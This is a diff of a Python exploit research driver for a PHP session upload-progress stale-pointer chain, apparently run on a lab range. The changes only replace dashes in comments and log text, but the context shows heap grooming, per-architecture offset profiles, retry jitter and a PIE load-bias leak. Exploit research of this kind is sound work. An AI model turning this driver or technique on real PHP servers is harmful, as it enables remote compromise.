@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""php2shell-bastet.py — range-native exploit research driver for
+"""php2shell-bastet.py - range-native exploit research driver for
 CVE-2026-109618/619 (PHP session.upload_progress stale-pointer chain).
 
 RULES OF ENGAGEMENT (hard):
@@ -15,7 +15,7 @@ Hardening lineage (research/shared/findings.md "live-fire verdict"):
      constants (jackalsyn's hardcoded --call was exactly our no-crash
      ambiguity).
   2. PROFILE REGISTRY: groom + forge offsets keyed per (arch, build, sapi).
-     x86-64 layout must NOT be applied to aarch64 — exact-profile match is
+     x86-64 layout must NOT be applied to aarch64 - exact-profile match is
      a hard gate; aarch64 needs pahole-derived structs first.
   3. ADAPTIVE RETRY ENVELOPE: N attempts with sid rotation and groom-count
      jitter; a miss on an untuned build is expected, not fatal.
@@ -85,8 +85,8 @@ def log(stage: str, msg: str, t0: float) -> None:
 # ------------------------------------------------------------------- leak --
 def leak_bias(leak_url: str, t0: float) -> int:
     """Lab oracle (?probe=base) leaks PIE load bias from /proc/self/maps.
-    Only our containers ship the lab sink, so the leak stage — and thus the
-    whole exploit — is range-scope by construction."""
+    Only our containers ship the lab sink, so the leak stage - and thus the
+    whole exploit - is range-scope by construction."""
     req = urllib.request.Request(leak_url + "?probe=base",
                                  headers={"User-Agent": "p2s-bastet"})
     with urllib.request.urlopen(req, timeout=15) as r:
@@ -279,7 +279,7 @@ def main() -> int:
             log("CHAIN", "COMPLETE", t0)
             print(body[:400].decode(errors="replace"))
             return 0
-    log("CHAIN", "FAILED — retune profile; see findings.md groom notes", t0)
+    log("CHAIN", "FAILED - retune profile; see findings.md groom notes", t0)
     return 1
 
 
